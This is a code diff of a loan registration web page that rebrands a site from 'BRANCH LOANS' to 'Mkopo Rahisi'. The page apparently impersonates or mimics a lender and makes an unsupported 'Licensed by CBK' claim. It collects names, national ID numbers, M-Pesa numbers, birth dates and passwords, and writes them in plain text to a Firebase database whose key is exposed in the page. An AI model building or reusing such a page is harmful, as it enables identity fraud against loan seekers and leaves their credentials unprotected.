@@ -4,17 +4,29 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="description" content="Register for quick loans up to Ksh 500,000 with Branch Loans. Fast approval, direct to M-Pesa.">
+    <meta name="description" content="Register for quick loans up to Ksh 500,000 with Mkopo Rahisi. Fast approval, direct to M-Pesa.">
     <link rel="icon" type="image/png" href="IMG-20250323-WA0008.png" />
-    <title>Register - BRANCH LOANS</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <title>Register - Mkopo Rahisi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
 
     <style>
-        /* ===== Base Styles ===== */
+        :root {
+            --primary: #2563eb;
+            --primary-dark: #1d4ed8;
+            --secondary: #10b981;
+            --accent: #f59e0b;
+            --light: #f8fafc;
+            --dark: #1e293b;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --error: #ef4444;
+        }
+        
         * {
             margin: 0;
             padding: 0;
@@ -26,26 +38,51 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            background: linear-gradient(135deg, #8ce9e9 0%, #e2e8f0 100%);
-            color: #2c3749;
+            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+            color: var(--dark);
+            line-height: 1.6;
         }
 
         .login-container {
             max-width: 500px;
             margin: 2rem auto;
             padding: 2rem;
-            background: rgba(255, 255, 255, 0.98);
+            background: white;
             border-radius: 16px;
-            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.15);
-            backdrop-filter: blur(4px);
-            border: 1px solid rgba(255, 255, 255, 0.18);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 1rem;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .logo i {
+            color: var(--accent);
         }
 
         .title {
-            color: #2c5282;
-            font-size: 1.8rem;
+            color: var(--dark);
+            font-size: 1.5rem;
             text-align: center;
-            margin-bottom: 1rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            text-align:center; 
+            color:#64748b; 
+            margin-bottom: 1.5rem;
+            font-size: 0.95rem;
         }
 
         .login-form {
@@ -55,74 +92,102 @@
             margin-top: 1.5rem;
         }
 
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
         label {
             font-weight: 600;
-            color: #2c5282;
-            font-size: 0.95rem;
+            color: var(--dark);
+            font-size: 0.9rem;
         }
 
         input, select {
-            padding: 0.8rem 1rem;
+            padding: 0.9rem 1rem;
             border: 1px solid #e2e8f0;
             border-radius: 8px;
             font-size: 1rem;
             transition: all 0.3s ease;
+            background: #f8fafc;
         }
 
         input:focus, select:focus {
             outline: none;
-            border-color: #2c5282;
-            box-shadow: 0 0 0 2px rgba(44, 82, 130, 0.2);
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+            background: white;
         }
 
         .login-btn {
-            padding: 1rem;
-            background: linear-gradient(135deg, #2c5282 0%, #2b6cb0 100%);
+            padding: 1.1rem;
+            background: linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 12px;
             font-size: 1.1rem;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(44, 82, 130, 0.3);
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
             margin-top: 1rem;
+            position: relative;
+            overflow: hidden;
         }
 
         .login-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(44, 82, 130, 0.4);
+            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
+        }
+
+        .login-btn:active {
+            transform: translateY(0);
         }
 
         .info-box {
             margin-top: 1.5rem;
-            background: rgba(237, 242, 247, 0.7);
-            border-left: 4px solid #2c5282;
+            background: rgba(241, 245, 249, 0.7);
+            border-left: 4px solid var(--primary);
             padding: 1rem;
             border-radius: 8px;
         }
 
         .info-box p:first-child {
             font-weight: bold;
-            color: #2c5282;
+            color: var(--primary);
             margin-bottom: 0.5rem;
+        }
+
+        .info-box p {
+            font-size: 0.9rem;
+            color: #64748b;
+        }
+
+        .terms {
+            margin-top: 1.5rem; 
+            font-size: 0.85em; 
+            text-align:center; 
+            color: #64748b;
+        }
+
+        .terms a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .terms a:hover {
+            text-decoration: underline;
         }
 
         .footer {
             text-align: center;
             padding: 1.5rem;
-            background: #2d3748;
+            background: var(--dark);
             color: white;
             margin-top: auto;
-        }
-
-        .footer a {
-            color: #a0aec0;
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            color: white;
+            font-size: 0.9rem;
         }
 
         /* Loader Styles */
@@ -133,17 +198,17 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.7);
             justify-content: center;
             align-items: center;
             z-index: 1000;
         }
 
         .spinner-beautiful {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #2c5282;
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(37, 99, 235, 0.2);
+            border-top: 5px solid var(--primary);
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -161,17 +226,12 @@
             }
             
             .title {
-                font-size: 1.5rem;
+                font-size: 1.4rem;
             }
         }
     </style>
 
     <script>
-        // TODO: Add SDKs for Firebase products that you want to use
-        // https://firebase.google.com/docs/web/setup#available-libraries
-
-        // Your web app's Firebase configuration
-        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
         const firebaseConfig = {
             apiKey: "AIzaSyDVJCpz7E6kKKxJHDJkcA5xCFVdfi2XoXs",
             authDomain: "fedha-loans-straight-to-m-pesa.firebaseapp.com",
@@ -190,113 +250,139 @@
 
 <body class="login-body">
     <div class="login-container">
+        <div class="logo">
+            <i class="fas fa-hand-holding-usd"></i>
+            <span>Mkopo Rahisi</span>
+        </div>
+        
         <h2 class="title">Find Your Loan Eligibility</h2>
-        <p style="text-align:center; color:#4a5568; margin-bottom: 1.5rem;">We offer loans from Ksh 2,000 to 500,000 disbursed directly to M-Pesa</p>
+        <p class="subtitle">We offer loans from Ksh 2,000 to 500,000 disbursed directly to M-Pesa</p>
 
         <form class="login-form">
-            <label for="name">Full Name</label>
-            <input type="text" id="name" name="name" placeholder="Enter your full name" required />
+            <div class="form-group">
+                <label for="name">Full Name</label>
+                <input type="text" id="name" name="name" placeholder="Enter your full name" required />
+            </div>
 
-            <label for="county">Select County</label>
-            <select id="county" name="county" required>
-                <option value="">--Select County--</option>
-                <option value="Mombasa">Mombasa</option>
-                <option value="Kwale">Kwale</option>
-                <option value="Kilifi">Kilifi</option>
-                <option value="Tana River">Tana River</option>
-                <option value="Lamu">Lamu</option>
-                <option value="Taita Taveta">Taita Taveta</option>
-                <option value="Garissa">Garissa</option>
-                <option value="Wajir">Wajir</option>
-                <option value="Mandera">Mandera</option>
-                <option value="Marsabit">Marsabit</option>
-                <option value="Isiolo">Isiolo</option>
-                <option value="Meru">Meru</option>
-                <option value="Tharaka Nithi">Tharaka Nithi</option>
-                <option value="Embu">Embu</option>
-                <option value="Kitui">Kitui</option>
-                <option value="Machakos">Machakos</option>
-                <option value="Makueni">Makueni</option>
-                <option value="Nyandarua">Nyandarua</option>
-                <option value="Nyeri">Nyeri</option>
-                <option value="Kirinyaga">Kirinyaga</option>
-                <option value="Murang'a">Murang'a</option>
-                <option value="Kiambu">Kiambu</option>
-                <option value="Turkana">Turkana</option>
-                <option value="West Pokot">West Pokot</option>
-                <option value="Samburu">Samburu</option>
-                <option value="Trans Nzoia">Trans Nzoia</option>
-                <option value="Uasin Gishu">Uasin Gishu</option>
-                <option value="Elgeyo Marakwet">Elgeyo Marakwet</option>
-                <option value="Nandi">Nandi</option>
-                <option value="Baringo">Baringo</option>
-                <option value="Laikipia">Laikipia</option>
-                <option value="Nakuru">Nakuru</option>
-                <option value="Narok">Narok</option>
-                <option value="Kajiado">Kajiado</option>
-                <option value="Kericho">Kericho</option>
-                <option value="Bomet">Bomet</option>
-                <option value="Kakamega">Kakamega</option>
-                <option value="Vihiga">Vihiga</option>
-                <option value="Bungoma">Bungoma</option>
-                <option value="Busia">Busia</option>
-                <option value="Siaya">Siaya</option>
-                <option value="Kisumu">Kisumu</option>
-                <option value="Homa Bay">Homa Bay</option>
-                <option value="Migori">Migori</option>
-                <option value="Kisii">Kisii</option>
-                <option value="Nyamira">Nyamira</option>
-                <option value="Nairobi">Nairobi</option>
-            </select>
+            <div class="form-group">
+                <label for="county">Select County</label>
+                <select id="county" name="county" required>
+                    <option value="">--Select County--</option>
+                    <option value="Mombasa">Mombasa</option>
+                    <option value="Kwale">Kwale</option>
+                    <option value="Kilifi">Kilifi</option>
+                    <option value="Tana River">Tana River</option>
+                    <option value="Lamu">Lamu</option>
+                    <option value="Taita Taveta">Taita Taveta</option>
+                    <option value="Garissa">Garissa</option>
+                    <option value="Wajir">Wajir</option>
+                    <option value="Mandera">Mandera</option>
+                    <option value="Marsabit">Marsabit</option>
+                    <option value="Isiolo">Isiolo</option>
+                    <option value="Meru">Meru</option>
+                    <option value="Tharaka Nithi">Tharaka Nithi</option>
+                    <option value="Embu">Embu</option>
+                    <option value="Kitui">Kitui</option>
+                    <option value="Machakos">Machakos</option>
+                    <option value="Makueni">Makueni</option>
+                    <option value="Nyandarua">Nyandarua</option>
+                    <option value="Nyeri">Nyeri</option>
+                    <option value="Kirinyaga">Kirinyaga</option>
+                    <option value="Murang'a">Murang'a</option>
+                    <option value="Kiambu">Kiambu</option>
+                    <option value="Turkana">Turkana</option>
+                    <option value="West Pokot">West Pokot</option>
+                    <option value="Samburu">Samburu</option>
+                    <option value="Trans Nzoia">Trans Nzoia</option>
+                    <option value="Uasin Gishu">Uasin Gishu</option>
+                    <option value="Elgeyo Marakwet">Elgeyo Marakwet</option>
+                    <option value="Nandi">Nandi</option>
+                    <option value="Baringo">Baringo</option>
+                    <option value="Laikipia">Laikipia</option>
+                    <option value="Nakuru">Nakuru</option>
+                    <option value="Narok">Narok</option>
+                    <option value="Kajiado">Kajiado</option>
+                    <option value="Kericho">Kericho</option>
+                    <option value="Bomet">Bomet</option>
+                    <option value="Kakamega">Kakamega</option>
+                    <option value="Vihiga">Vihiga</option>
+                    <option value="Bungoma">Bungoma</option>
+                    <option value="Busia">Busia</option>
+                    <option value="Siaya">Siaya</option>
+                    <option value="Kisumu">Kisumu</option>
+                    <option value="Homa Bay">Homa Bay</option>
+                    <option value="Migori">Migori</option>
+                    <option value="Kisii">Kisii</option>
+                    <option value="Nyamira">Nyamira</option>
+                    <option value="Nairobi">Nairobi</option>
+                </select>
+            </div>
 
-            <label for="mpesa">M-Pesa Number</label>
-            <input type="text" id="mpesa" name="mpesa" placeholder="07XXXXXXXX" required />
+            <div class="form-group">
+                <label for="mpesa">M-Pesa Number</label>
+                <input type="text" id="mpesa" name="mpesa" placeholder="07XXXXXXXX" required />
+            </div>
 
-            <label for="id">National ID Number</label>
-            <input type="text" id="id" name="id" placeholder="Enter your ID number" required />
+            <div class="form-group">
+                <label for="id">National ID Number</label>
+                <input type="text" id="id" name="id" placeholder="Enter your ID number" required />
+            </div>
 
-            <label for="gender">Gender</label>
-            <select id="gender" name="gender" required>
-                <option value="">--Select Gender--</option>
-                <option value="Male">Male</option>
-                <option value="Female">Female</option>
-                <option value="Other">Other</option>
-            </select>
+            <div class="form-group">
+                <label for="gender">Gender</label>
+                <select id="gender" name="gender" required>
+                    <option value="">--Select Gender--</option>
+                    <option value="Male">Male</option>
+                    <option value="Female">Female</option>
+                    <option value="Other">Other</option>
+                </select>
+            </div>
 
-            <label for="dob">Date of Birth</label>
-            <input type="date" id="dob" name="dob" required />
+            <div class="form-group">
+                <label for="dob">Date of Birth</label>
+                <input type="date" id="dob" name="dob" required />
+            </div>
 
-            <label for="marital">Marital Status</label>
-            <select id="marital" name="marital" required>
-                <option value="">--Select Marital Status--</option>
-                <option value="Single">Single</option>
-                <option value="Married">Married</option>
-                <option value="Divorced">Divorced</option>
-                <option value="Widowed">Widowed</option>
-            </select>
+            <div class="form-group">
+                <label for="marital">Marital Status</label>
+                <select id="marital" name="marital" required>
+                    <option value="">--Select Marital Status--</option>
+                    <option value="Single">Single</option>
+                    <option value="Married">Married</option>
+                    <option value="Divorced">Divorced</option>
+                    <option value="Widowed">Widowed</option>
+                </select>
+            </div>
 
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" placeholder="Enter password" required />
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter password" required />
+            </div>
 
-            <label for="confirmPassword">Confirm Password</label>
-            <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Confirm password" required />
+            <div class="form-group">
+                <label for="confirmPassword">Confirm Password</label>
+                <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Confirm password" required />
+            </div>
 
-            <button type="submit" class="login-btn">Next</button>
+            <button type="submit" class="login-btn">
+                <i class="fas fa-arrow-right"></i> Continue to Eligibility
+            </button>
         </form>
 
         <div class="info-box">
-            <p>No CRB Check, No Guarantors, No Paperwork</p>
-            <p>Loans disbursed directly to your M-Pesa account.</p>
+            <p>Why Choose Mkopo Rahisi?</p>
+            <p>✓ No CRB Check ✓ No Guarantors ✓ No Paperwork</p>
+            <p>Loans disbursed directly to your M-Pesa account within minutes</p>
         </div>
 
-        <p style="margin-top: 1.5rem; font-size: 0.9em; text-align:center; color: #4a5568;">
-            By submitting you confirm that you accept the <a href="#" style="color:#2c5282; text-decoration:none; font-weight:bold;">Terms and Conditions</a>
-            and <a href="#" style="color:#2c5282; text-decoration:none; font-weight:bold;">Privacy Policy</a>.
+        <p class="terms">
+            By submitting you confirm that you accept the <a href="#">Terms and Conditions</a>
+            and <a href="#">Privacy Policy</a>.
         </p>
     </div>
 
     <footer class="footer">
-        <p>&copy; 2025 BRANCH LOANS. All rights reserved.</p>
+        <p>&copy; 2025 Mkopo Rahisi. Licensed by CBK. All rights reserved.</p>
     </footer>
 
     <div class="overlay-spinner" id="loadingOverlay" style="display:none;">
@@ -329,12 +415,11 @@
                     dob: document.getElementById('dob').value,
                     marital: document.getElementById('marital').value,
                     password: password,
-                    yere: "null" // added here
+                    yere: "null"
                 };
 
                 db.ref('users/' + mpesa).set(userData)
                     .then(() => {
-                        // Save M-Pesa number and name in sessionStorage
                         sessionStorage.setItem('mpesaNumber', mpesa);
                         sessionStorage.setItem('accountName', userData.name);
                         setTimeout(() => {
